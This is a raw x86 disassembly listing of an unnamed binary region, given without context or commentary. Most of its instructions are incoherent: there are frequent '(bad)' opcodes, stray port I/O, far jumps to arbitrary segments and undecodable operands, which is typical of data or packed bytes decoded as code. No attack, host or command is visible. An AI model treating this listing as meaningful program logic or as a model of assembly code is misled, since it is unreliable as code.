  426b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b76:	xor    eax,0xcf0a7df3
  426b7b:	in     al,dx
  426b7c:	and    eax,0x2a36d721
	...
  426b89:	add    BYTE PTR [edi+0x56],al
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x2181,0x63
  426b98:	mov    DWORD PTR [ecx],edi
  426b9a:	mov    ebp,0x7b0001f8
  426b9f:	push   es
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	(bad)  
  426ba3:	mov    eax,ds:0xb3f32e6a
  426ba8:	out    0xb7,al
  426baa:	pop    ebp
  426bab:	es test al,0x1c
  426bae:	int3   
  426baf:	mov    DWORD PTR [esi-0x3f1cf5fc],esi
  426bb5:	pop    esp
  426bb6:	ins    DWORD PTR es:[edi],dx
  426bb7:	adc    eax,0x55714548
  426bbc:	rcl    DWORD PTR [edx],cl
  426bbe:	pop    ds
  426bbf:	leave  
  426bc0:	(bad)  
  426bc1:	cmp    cl,BYTE PTR [ebp+0x3f32d330]
  426bc7:	and    dh,BYTE PTR [eax-0x109c4dfc]
  426bcd:	cs sbb al,0xbd
  426bd0:	cmp    esp,DWORD PTR [ebp-0x2c]
  426bd3:	ins    BYTE PTR es:[edi],dx
  426bd4:	ret    
  426bd5:	cmc    
  426bd6:	pushf  
  426bd7:	jns    0x426bcf
  426bd9:	add    al,0x6f
  426bdb:	neg    BYTE PTR [si]
  426bde:	sub    DWORD PTR [ecx-0x4f217842],edi
  426be4:	dec    ebp
  426be5:	cmp    al,0x6
  426be7:	rol    BYTE PTR [ebp-0x63],cl
  426bea:	or     ebx,0x21
  426bed:	push   edi
  426bee:	push   0xffffff94
  426bf0:	xor    ebp,DWORD PTR [edx+0x1]
  426bf3:	cmp    al,0xfb
  426bf5:	sti    
  426bf6:	pop    edx
  426bf7:	mov    bh,0x22
  426bf9:	scas   al,BYTE PTR es:[edi]
  426bfa:	push   edi
  426bfb:	outs   dx,BYTE PTR ds:[esi]
  426bfc:	xchg   edx,eax
  426bfd:	cmp    ebx,DWORD PTR [ebx-0x582f12ca]
  426c03:	pop    edi
  426c04:	cmp    al,0x32
  426c06:	pusha  
  426c07:	aaa    
  426c08:	out    dx,al
  426c09:	inc    eax
  426c0a:	mov    al,ds:0x6fd1141a
  426c0f:	jne    0x426bcd
  426c11:	mov    dl,0xc4
  426c13:	test   DWORD PTR [ecx],ebx
  426c15:	stos   BYTE PTR es:[edi],al
  426c16:	ds retf 
  426c18:	repz push es
  426c1a:	add    al,0x61
  426c1c:	(bad)  
  426c1d:	popa   
  426c1e:	sbb    bl,dh
  426c20:	pop    eax
  426c21:	add    cl,dh
  426c23:	mov    esi,DWORD PTR [ebp+0x71c10244]
  426c29:	ret    
  426c2a:	xchg   edi,eax
  426c2b:	lock and DWORD PTR [ebp-0xe],edi
  426c2f:	outs   dx,DWORD PTR ds:[esi]
  426c30:	clc    
  426c31:	cmp    DWORD PTR [edi+eiz*2+0x6e],0x31
  426c36:	mov    bl,0x1c
  426c38:	and    DWORD PTR [ecx],0xb125399e
  426c3e:	shl    DWORD PTR [ebp+ebp*8-0x40a1a3a0],0xa3
  426c46:	outs   dx,BYTE PTR ds:[esi]
  426c47:	shr    BYTE PTR [edi],0xf7
  426c4a:	fwait
  426c4b:	or     edi,DWORD PTR [edi-0x661ab9b2]
  426c51:	sbb    BYTE PTR [edx-0x72],dl
  426c54:	sbb    eax,0x2e3550d1
  426c59:	xchg   edx,eax
  426c5a:	and    esp,DWORD PTR [ecx]
  426c5c:	out    dx,eax
  426c5d:	push   eax
  426c5e:	and    esi,DWORD PTR [ecx-0x48cb9970]
  426c64:	push   cs
  426c65:	rol    BYTE PTR [eax+edx*4+0x78],1
  426c69:	emms   
  426c6b:	scas   al,BYTE PTR es:[edi]
  426c6c:	push   ds
  426c6d:	popa   
  426c6e:	push   eax
  426c6f:	push   ebx
  426c70:	arpl   WORD PTR [esi],di
  426c72:	pop    edi
  426c73:	add    ch,BYTE PTR [eax+edx*8+0x53]
  426c77:	jle    0x426cb7
  426c79:	pop    ebx
  426c7a:	repz sub al,BYTE PTR [bx+0x6dd3]
  426c80:	and    esp,DWORD PTR [eax+0x32]
  426c83:	cs into 
  426c85:	imul   edx,DWORD PTR [ebx],0xfffffff1
  426c88:	mov    esp,0x32afea0b
  426c8e:	cwde   
  426c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c90:	jb     0x426c3b
  426c92:	shr    ebx,1
  426c94:	adc    ebx,eax
  426c96:	iret   
  426c97:	sbb    BYTE PTR [ebx],al
  426c99:	push   0x23
  426c9b:	push   ebp
  426c9c:	adc    al,bl
  426c9e:	mov    WORD PTR [esi-0x77],fs
  426ca1:	cdq    
  426ca2:	out    0x37,eax
  426ca4:	pop    ds
  426ca5:	sub    ebx,DWORD PTR [esi+0x390dcf8e]
  426cab:	push   0xffffffaa
  426cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cae:	ror    BYTE PTR [ebx+0x3735b9db],0xef
  426cb5:	(bad)  
  426cb6:	or     ecx,DWORD PTR [edx]
  426cb8:	push   es
  426cb9:	ds call 0x9e82:0xd3bc89aa
  426cc1:	xchg   bl,ch
  426cc3:	fmul   DWORD PTR [ecx-0x1e01db45]
  426cc9:	imul   ecx,DWORD PTR [edi+0x528530b8],0x6ee98fb3
  426cd3:	adc    al,0xa8
  426cd5:	push   ds
  426cd6:	jo     0x426d55
  426cd8:	jo     0x426d2b
  426cda:	xor    dh,bl
  426cdc:	pop    es
  426cdd:	mov    eax,?
  426cdf:	push   0xffffffa2
  426ce1:	cs enter 0xb8a8,0x6a
  426ce6:	xchg   ebp,eax
  426ce7:	pushf  
  426ce8:	jl     0x426cc2
  426cea:	retf   0xde58
  426ced:	jno    0x426cf1
  426cef:	pop    ds
  426cf0:	xor    cl,dh
  426cf2:	and    bl,cl
  426cf4:	dec    esp
  426cf5:	addr16 pop edi
  426cf7:	jl     0x426ca2
  426cf9:	sbb    BYTE PTR [eax],bh
  426cfb:	div    DWORD PTR [eax+ebp*2+0x29bebe7d]
  426d02:	sbb    al,0xa4
  426d04:	xchg   edx,eax
  426d05:	mov    esp,eax
  426d07:	retf   
  426d08:	pushf  
  426d09:	xor    DWORD PTR [esi+0x24],ebp
  426d0c:	cmp    al,0x6b
  426d0e:	ins    BYTE PTR es:[edi],dx
  426d0f:	dec    edx
  426d10:	adc    DWORD PTR [esi+0x1f],edx
  426d13:	inc    eax
  426d14:	shr    BYTE PTR ss:[edx+0x2f1437a9],0x3c
  426d1c:	clc    
  426d1d:	inc    esi
  426d1e:	inc    ebx
  426d1f:	pop    esi
  426d20:	fwait
  426d21:	pop    ds
  426d22:	outs   dx,BYTE PTR ds:[esi]
  426d23:	mov    esi,0x7437b6ce
  426d28:	jb     0x426d48
  426d2a:	mov    bl,0xeb
  426d2c:	test   DWORD PTR [esi],ebx
  426d2e:	mov    ch,0x97
  426d30:	push   0x12
  426d32:	imul   esp,DWORD PTR [edx+ebp*2+0xca87f73],0xffffff94
  426d3a:	es ret 0x6fad
  426d3e:	(bad)  [edx+0x4a9b4b8b]
  426d44:	jne    0x426d76
  426d46:	mov    ebx,edi
  426d48:	and    esp,ebx
  426d4a:	ror    BYTE PTR [eax+ebx*4],1
  426d4d:	mov    bl,0x96
  426d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d50:	(bad)  
  426d51:	jbe    0x426dc3
  426d53:	pop    esi
  426d54:	inc    edi
  426d55:	(bad)  
  426d56:	daa    
  426d57:	push   esp
  426d58:	mov    dh,0xd6
  426d5a:	scas   al,BYTE PTR es:[edi]
  426d5b:	addr16 retf 
  426d5d:	cmp    edx,DWORD PTR [ebx+ebp*8-0x7]
  426d61:	mov    bl,ah
  426d63:	cs shl dh,1
  426d66:	aam    0xae
  426d68:	push   ds
  426d69:	fdiv   DWORD PTR [edx]
  426d6b:	dec    DWORD PTR [esi+edi*8+0x63e9454]
  426d72:	mov    WORD PTR [eax-0x69],gs
  426d75:	lods   eax,DWORD PTR ds:[esi]
  426d76:	test   al,0xfc
  426d78:	sub    al,0x5e
  426d7a:	xchg   ecx,eax
  426d7b:	std    
  426d7c:	pop    ebp
  426d7d:	mov    edx,0x95a16407
  426d82:	test   BYTE PTR [esi-0x28d083ae],dh
  426d88:	mov    WORD PTR [ebp+0x49182ed1],?
  426d8e:	mov    WORD PTR [eax],?
  426d90:	lods   eax,DWORD PTR ds:[esi]
  426d91:	mov    ebp,0x65ffc591
  426d96:	xchg   esp,eax
  426d97:	add    al,0x48
  426d99:	push   ecx
  426d9a:	sub    BYTE PTR [esi-0x3af12af7],al
  426da0:	xchg   edx,eax
  426da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426da2:	(bad)  
  426da3:	pusha  
  426da4:	mov    esp,0xf79e8f4f
  426da9:	or     bh,ah
  426dab:	xchg   ebx,eax
  426dac:	lods   eax,DWORD PTR ds:[esi]
  426dad:	aad    0x70
  426daf:	out    dx,eax
  426db0:	cwde   
  426db1:	in     al,0x4d
  426db3:	fidiv  WORD PTR [ecx-0x5e018945]
  426db9:	in     al,dx
  426dba:	inc    edx
  426dbb:	loop   0x426db1
  426dbd:	sub    bh,BYTE PTR [eax+0x62a3def2]
  426dc3:	mov    ch,0xbf
  426dc5:	mov    WORD PTR [ebx+0x65],?
  426dc8:	mov    dh,0x83
  426dca:	js     0x426d8d
  426dcc:	pop    ds
  426dcd:	jno    0x426ddc
  426dcf:	cmp    BYTE PTR [ebp+0x35],dh
  426dd2:	sub    DWORD PTR [eax-0x1],esi
  426dd5:	test   dh,dh
  426dd7:	not    ebx
  426dd9:	jmp    0x3f00eae5
  426dde:	jle    0x426dbe
  426de0:	adc    al,BYTE PTR [ebx+0xc13169e]
  426de6:	clc    
  426de7:	psubsb mm1,mm1
  426dea:	std    
  426deb:	(bad)  
  426dec:	mov    ebx,0xd5d9a09b
  426df1:	push   esi
  426df2:	sar    DWORD PTR [edx],cl
  426df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426df5:	push   0x7fa58879
  426dfa:	mov    edx,0xaddcbd0c
  426dff:	arpl   bx,bx
  426e01:	xchg   edi,esi
  426e03:	xchg   edx,eax
  426e04:	mov    ah,0x5b
  426e06:	ins    DWORD PTR es:[edi],dx
  426e07:	sahf   
  426e08:	iret   
  426e09:	adc    ch,0x82
  426e0c:	jnp    0x426e71
  426e0e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  426e10:	loopne 0x426db2
  426e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e13:	mov    eax,0xb36778a8
  426e18:	mov    cl,0xf6
  426e1a:	idiv   BYTE PTR [esi+0x47]
  426e1d:	popf   
  426e1e:	push   edx
  426e1f:	in     al,dx
  426e20:	(bad)  
  426e21:	loop   0x426e44
  426e23:	mov    ch,0x1a
  426e25:	daa    
  426e26:	xlat   BYTE PTR ds:[ebx]
  426e27:	btc    DWORD PTR [ebx+0xebe5c53],0xae
  426e2f:	sbb    BYTE PTR [esi],0x4
  426e32:	dec    edx
  426e33:	dec    ecx
  426e34:	sbb    BYTE PTR [ebx-0x24],dh
  426e37:	cmp    ah,BYTE PTR [edx]
  426e39:	push   esp
  426e3a:	and    ch,BYTE PTR ds:0xda3d2186
  426e40:	adc    bh,bl
  426e42:	jge    0x426ea3
  426e44:	inc    edx
  426e45:	(bad)  
  426e46:	xchg   esi,eax
  426e47:	mov    ebx,0x48954c80
  426e4c:	sbb    DWORD PTR es:[esp+eax*8-0x61b46328],esp
  426e54:	fdiv   st,st(3)
  426e56:	mov    ds:0xcd9a7677,al
  426e5b:	sub    DWORD PTR [edi-0x53],edx
  426e5e:	mov    ch,0xab
  426e60:	sahf   
  426e61:	add    ebx,DWORD PTR [edx+0x4bae03db]
  426e67:	mov    bh,0x41
  426e69:	fnstsw WORD PTR [edi+0x556492b2]
  426e6f:	adc    WORD PTR [eax],dx
  426e72:	out    0x57,al
  426e74:	into   
  426e75:	paddusw mm7,mm7
  426e78:	stos   BYTE PTR es:[edi],al
  426e79:	pop    ebp
  426e7a:	lock and eax,0x48b0162
  426e80:	jmp    0xc74:0xc15c838a
  426e87:	xchg   esi,eax
  426e88:	stc    
  426e89:	push   ecx
  426e8a:	data16 test BYTE PTR [edi],0x88
  426e8e:	push   edx
  426e8f:	sub    DWORD PTR [esi],eax
  426e91:	fldcw  WORD PTR [ebx+0x7b]
  426e94:	call   0xa80bfd3
  426e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e9a:	inc    esi
  426e9b:	dec    ecx
  426e9c:	inc    ebp
  426e9d:	dec    ebx
  426e9e:	fstp   TBYTE PTR [eax+0x7e]
  426ea1:	dec    ebp
  426ea2:	jns    0x426e6a
  426ea4:	mov    bh,0x54
  426ea6:	xchg   BYTE PTR [ebx],dh
  426ea8:	pushf  
  426ea9:	pop    ss
  426eaa:	sub    al,0xf6
  426eac:	push   0xc58598cc
  426eb1:	inc    DWORD PTR [ebp-0x6bcd7591]
  426eb7:	fisttp QWORD PTR [ebx]
  426eb9:	pop    esp
  426eba:	xor    BYTE PTR [edi+eiz*4+0x71b53489],cl
  426ec1:	pop    ecx
  426ec2:	dec    edi
  426ec3:	cwde   
  426ec4:	in     eax,0xb8
  426ec6:	clc    
  426ec7:	scas   eax,DWORD PTR es:[edi]
  426ec8:	sbb    ebx,DWORD PTR [eax]
  426eca:	mov    cl,0x56
  426ecc:	cmp    eax,0xf8d74991
  426ed1:	mov    WORD PTR [edi+0x7d],cs
  426ed4:	lods   al,BYTE PTR ds:[esi]
  426ed5:	xor    cl,BYTE PTR [ebp+ebp*2-0x16]
  426ed9:	mov    al,0xa1
  426edb:	arpl   WORD PTR [ebp+0x518e1fdd],bx
  426ee1:	aas    
  426ee2:	sbb    BYTE PTR [eax+0x278cd432],bl
  426ee8:	lds    edx,FWORD PTR [esi]
  426eea:	out    dx,al
  426eeb:	dec    edi
  426eec:	sub    ebp,DWORD PTR [edi+0x55]
  426eef:	add    al,0xa8
  426ef1:	push   cs
  426ef2:	stos   BYTE PTR es:[edi],al
  426ef3:	push   edi
  426ef4:	or     eax,0x709b7cb4
  426ef9:	inc    ecx
  426efa:	cmc    
  426efb:	repnz sbb eax,0x233117fd
  426f01:	stos   BYTE PTR es:[edi],al
  426f02:	add    ecx,esi
  426f04:	icebp  
  426f05:	push   ebx
  426f06:	mov    bh,0xe7
  426f08:	lock inc ecx
  426f0a:	jle    0x426ee1
  426f0c:	jg     0x426eaa
  426f0e:	pusha  
  426f0f:	retf   0x64e4
  426f12:	(bad)
  426f15:	fisub  WORD PTR [eax]
  426f17:	sbb    eax,0xa81a658f
  426f1c:	and    al,0xb0
  426f1e:	adc    esp,DWORD PTR [ebp+ebp*8+0x753a1ac8]
  426f25:	adc    esp,ecx
  426f27:	adc    al,0x21
  426f29:	mov    dh,0x93
  426f2b:	call   FWORD PTR [ecx+0x15dfb48d]
  426f31:	dec    eax
  426f32:	test   DWORD PTR [ebx],edx
  426f34:	aas    
  426f35:	mov    eax,0x157789c7
  426f3a:	sub    DWORD PTR [edx+ebp*2],eax
  426f3d:	bt     DWORD PTR [esi-0x23f522af],ebx
  426f44:	lahf   
  426f45:	pop    esp
  426f46:	xchg   DWORD PTR [edx],ecx
  426f48:	fisubr DWORD PTR [ebp+0x1f913be5]
  426f4e:	sahf   
  426f4f:	cmp    eax,0x8482f8b0
  426f54:	xchg   ebp,eax
  426f55:	mov    edi,DWORD PTR [edi]
  426f57:	dec    ecx
  426f58:	and    al,0xf2
  426f5a:	mov    BYTE PTR [ebp+0x34df5973],bl
  426f60:	mov    DWORD PTR [ebp+ebp*1-0x3adfc95a],ebp
  426f67:	iret   
  426f68:	inc    ebp
  426f69:	cdq    
  426f6a:	stos   DWORD PTR es:[edi],eax
  426f6b:	xchg   edx,eax
  426f6c:	sbb    DWORD PTR [ecx-0x73aeb905],ecx
  426f72:	sbb    BYTE PTR [edi+ebp*8+0x1c38f96f],ah
  426f79:	aam    0xa0
  426f7b:	push   ecx
  426f7c:	(bad)  
  426f7d:	sub    al,al
  426f7f:	inc    ecx
  426f80:	xlat   BYTE PTR ds:[ebx]
  426f81:	outs   dx,DWORD PTR ds:[esi]
  426f82:	sbb    edx,DWORD PTR ss:[edi-0x6e]
  426f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f87:	fisub  WORD PTR [edi-0x3d]
  426f8a:	lock or esi,DWORD PTR [ebx]
  426f8d:	call   0x971e:0x4078c76b
  426f94:	fld    DWORD PTR [esi]
  426f96:	mov    BYTE PTR [edx+0x52],bl
  426f99:	pop    ecx
  426f9a:	into   
  426f9b:	mov    eax,0x78d097e1
  426fa0:	jno    0x426f85
  426fa2:	inc    ebx
  426fa3:	ret    0x1000
  426fa6:	mov    ebp,0x700e91e6
  426fab:	adc    cl,BYTE PTR [ebx+0x1be7287b]
  426fb1:	push   es
  426fb2:	shr    DWORD PTR [ecx],1
  426fb4:	popf   
  426fb5:	cld    
  426fb6:	lahf   
  426fb7:	shr    BYTE PTR [ebp+0x44],1
  426fba:	ret    
  426fbb:	cwde   
  426fbc:	outs   dx,BYTE PTR ds:[esi]
  426fbd:	lods   al,BYTE PTR ds:[esi]
  426fbe:	dec    esi
  426fbf:	sub    ah,bh
  426fc1:	dec    eax
  426fc2:	jl     0x426fec
  426fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fc5:	fimul  DWORD PTR gs:[ebp+0x136e2158]
  426fcc:	test   DWORD PTR [esi],ecx
  426fce:	or     dh,BYTE PTR [eax]
  426fd0:	lahf   
  426fd1:	inc    edi
  426fd2:	push   0xffffff96
  426fd4:	adc    al,0x7e
  426fd6:	jle    0x426fef
  426fd8:	jnp    0x426f8f
  426fda:	xor    BYTE PTR [ebp-0x17],bh
  426fdd:	mov    ds:0xc6d25931,al
  426fe2:	and    ebx,eax
  426fe4:	add    bl,BYTE PTR [edx-0x1a42ad0e]
  426fea:	xor    bh,BYTE PTR [eax+0x1a]
  426fed:	cld    
  426fee:	jbe    0x427036
  426ff0:	call   0x432:0x7d52af86
  426ff7:	sbb    eax,0x5c70f02a
  426ffc:	jae    0x426fc3
  426ffe:	shl    BYTE PTR [edi+0x2b],1
  427001:	dec    esp
  427002:	in     eax,dx
  427003:	aaa    
  427004:	xchg   ebx,eax
  427005:	pop    edx
  427006:	or     esi,DWORD PTR [edx-0x279fd35f]
  42700c:	rcr    DWORD PTR ss:[ebp-0x36],0x24
  427011:	jmp    0xf8ba:0xbf016932
  427018:	pusha  
  427019:	fcomi  st,st(4)
  42701b:	jge    0x427012
  42701d:	xchg   ebx,eax
  42701e:	jo     0x427010
  427020:	stos   BYTE PTR es:[edi],al
  427021:	jne    0x42708b
  427023:	and    ch,BYTE PTR [ecx+0x1e]
  427026:	js     0x427042
  427028:	mov    eax,0xf2ee6770
  42702d:	cwde   
  42702e:	sub    DWORD PTR [esi+ecx*1],0x31e49ea
  427035:	mov    ecx,0xcf37fc04
  42703a:	adc    dl,BYTE PTR [edx]
  42703c:	jmp    0x503:0xfd1b6520
  427043:	fsubr  st(4),st
  427045:	inc    edi
  427046:	test   eax,0xa61f61e2
  42704b:	jbe    0x426ff4
  42704d:	jp     0x426ff3
  42704f:	mov    bh,0xe1
  427051:	ins    DWORD PTR es:[edi],dx
  427052:	pop    esi
  427053:	mov    ds:0x1613c7db,eax
  427058:	sbb    DWORD PTR [edx],0x4b5eaea4
  42705e:	popa   
  42705f:	pop    edi
  427060:	jl     0x427086
  427062:	sub    dl,dh
  427064:	mov    es,WORD PTR [eax+0x71d723d0]
  42706a:	cli    
  42706b:	inc    esp
  42706c:	arpl   WORD PTR [edx-0x793702ef],cx
  427072:	sahf   
  427073:	mov    ebp,ecx
  427075:	push   ebp
  427076:	aad    0xfe
  427078:	and    eax,DWORD PTR [edi+0x6f58b4d8]
  42707e:	fsub   st(6),st
  427080:	retf   0x6a40
  427083:	xchg   ebp,eax
  427084:	pop    ebx
  427085:	jne    0x4270d2
  427087:	sub    esp,DWORD PTR [esp+esi*1+0x6c9b8e99]
  42708e:	out    dx,eax
  42708f:	add    BYTE PTR [esi+0xfa2bbae],al
  427095:	cmp    eax,0x9535b478
  42709a:	popa   
  42709b:	xchg   BYTE PTR [ebp+0x5],al
  42709e:	mov    gs,WORD PTR [esi]
  4270a0:	repz es xor al,0x4
  4270a4:	dec    DWORD PTR [ebx-0x454cfcba]
  4270aa:	adc    DWORD PTR [ecx+0x6df582a8],edi
  4270b0:	imul   esp,DWORD PTR [eax],0x4
  4270b3:	mov    ch,0x54
  4270b5:	push   esi
  4270b6:	add    DWORD PTR [edx],ebx
  4270b8:	imul   esp,DWORD PTR [edi+0x7f],0x66
  4270bc:	and    DWORD PTR [esi],eax
  4270be:	test   DWORD PTR [edi+0x74b95892],eax
  4270c4:	xchg   ch,al
  4270c6:	jge    0x427094
  4270c8:	repz scas eax,DWORD PTR es:[edi]
  4270ca:	jns    0x42713a
  4270cc:	out    0xe5,al
  4270ce:	dec    ecx
  4270cf:	das    
  4270d0:	and    ah,BYTE PTR [esi+0x675c005d]
  4270d6:	or     esi,DWORD PTR [edi-0x5d7333a6]
  4270dc:	xchg   edx,eax
  4270dd:	aad    0xfe
  4270df:	es mov ch,0xd4
  4270e2:	mov    ?,WORD PTR [edi]
  4270e4:	sub    eax,0xd3be3336
  4270e9:	int    0x0
  4270eb:	rcl    BYTE PTR ds:0xa6b0257b,0xbb
  4270f2:	mov    es,WORD PTR [eax]
  4270f4:	push   cs
  4270f5:	jg     0x42708e
  4270f7:	ret    
  4270f8:	daa    
  4270f9:	lahf   
  4270fa:	cmp    BYTE PTR [ecx-0x4a93a426],0x9
  427101:	pop    ds
  427102:	and    al,0x8e
  427104:	les    ebp,FWORD PTR [esi+0x36]
  427107:	sahf   
  427108:	ror    BYTE PTR [edi+0x12],cl
  42710b:	adc    BYTE PTR [ebp+0x21],0x38
  42710f:	adc    al,0x4c
  427111:	sub    bh,BYTE PTR [ebx-0x2a]
  427114:	sub    eax,0x1abaaeaa
  427119:	stos   DWORD PTR es:[edi],eax
  42711a:	or     esp,DWORD PTR [eax]
  42711c:	xor    BYTE PTR ds:0x768527df,al
  427122:	adc    BYTE PTR [ebp+0xbffaee7],ah
  427128:	repz inc esp
  42712a:	fstp   TBYTE PTR [ecx+ecx*8]
  42712d:	je     0x4271a8
  42712f:	ss jle 0x4270ea
  427132:	push   ebx
  427133:	shl    BYTE PTR [eax],0x84
  427136:	sub    DWORD PTR [esi-0x571cdb3a],ebx
  42713c:	cmp    BYTE PTR [ecx],dh
  42713e:	adc    BYTE PTR [edi+0x7f],dl
  427141:	dec    eax
  427142:	outs   dx,BYTE PTR ds:[esi]
  427143:	imul   edi,DWORD PTR [ecx],0x70
  427146:	jmp    0xa1c9a5a4
  42714b:	test   DWORD PTR [ebx+0x2d],0x8e3950e6
  427152:	xchg   DWORD PTR [ecx+0x62],ecx
  427155:	push   ebp
  427156:	inc    ecx
  427157:	cmp    ecx,edi
  427159:	mov    edi,0xa344ef3c
  42715e:	push   edx
  42715f:	adc    DWORD PTR [esi],esi
  427161:	mov    al,ds:0xe5f37425
  427166:	sbb    bh,BYTE PTR [eax-0x702e87ce]
  42716c:	out    dx,al
  42716d:	fcomp  DWORD PTR [esi-0x6e4e63e]
  427173:	retf   0xa2ed
  427176:	xchg   esi,eax
  427177:	test   eax,0xe6eaafdc
  42717c:	out    dx,eax
  42717d:	jg     0x427147
  42717f:	repnz xor dh,dl
  427182:	stos   BYTE PTR es:[edi],al
  427183:	sub    BYTE PTR [edi+0x3fbdc242],dh
  427189:	and    al,0xae
  42718b:	fcom   QWORD PTR [edi]
  42718d:	loopne 0x42715b
  42718f:	ss jns 0x427186
  427192:	add    BYTE PTR [ebx-0x77],0x17
  427196:	stc    
  427197:	aaa    
  427198:	scas   eax,DWORD PTR es:[edi]
  427199:	dec    ebx
  42719a:	mov    BYTE PTR [edx],bh
  42719c:	mov    edi,0x1b722a63
  4271a1:	xchg   esp,eax
  4271a2:	cdq    
  4271a3:	cdq    
  4271a4:	mov    esi,0x7437e628
  4271a9:	cmp    BYTE PTR [eax],0xd4
  4271ac:	add    DWORD PTR [ecx+0x400f307c],esi
  4271b2:	add    al,0x83
  4271b4:	bound  esi,QWORD PTR [edx-0x22b15ffd]
  4271ba:	cmp    ah,cl
  4271bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271bd:	aad    0x4d
  4271bf:	inc    esi
  4271c0:	adc    DWORD PTR [ecx],eax
  4271c2:	inc    esi
  4271c3:	retf   
  4271c4:	and    ch,ah
  4271c6:	dec    eax
  4271c7:	or     esp,ebp
  4271c9:	xor    edx,0xffffff89
  4271cc:	and    ch,BYTE PTR [esi+0x39931b69]
  4271d2:	aam    0xaf
  4271d4:	add    bh,BYTE PTR [edx]
  4271d6:	push   ebp
  4271d7:	scas   al,BYTE PTR es:[edi]
  4271d8:	pop    ds
  4271d9:	jnp    0x4271cf
  4271db:	adc    edi,DWORD PTR [edi+eax*2]
  4271de:	xor    eax,0xe4a64330
  4271e3:	mov    dh,0xc2
  4271e5:	jns    0x4271aa
  4271e7:	or     esi,DWORD PTR [esi-0x50]
  4271ea:	mov    BYTE PTR [edx],ah
  4271ec:	bnd jnp 0x4271f6
  4271ef:	loope  0x42724f
  4271f1:	ja     0x42726d
  4271f3:	lahf   
  4271f4:	popa   
  4271f5:	jae    0x427239
  4271f7:	and    BYTE PTR [esi-0x1d1c3433],dl
  4271fd:	(bad)  
  4271fe:	dec    ebp
  4271ff:	fistp  DWORD PTR [edx-0x33]
  427202:	mov    ah,0xf8
  427204:	retw   0x8e2d
  427208:	mov    dl,0x8f
  42720a:	push   edi
  42720b:	in     eax,dx
  42720c:	imul   esp,DWORD PTR [ecx-0x17],0xffffff97
  427210:	sbb    al,0xca
  427212:	cwde   
  427213:	and    bl,BYTE PTR [ebx+ecx*2+0xef7ebae]
  42721a:	lock and esp,DWORD PTR [edi+0x0]
	...
  42722a:	dec    ebp
  42722b:	push   ebp
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
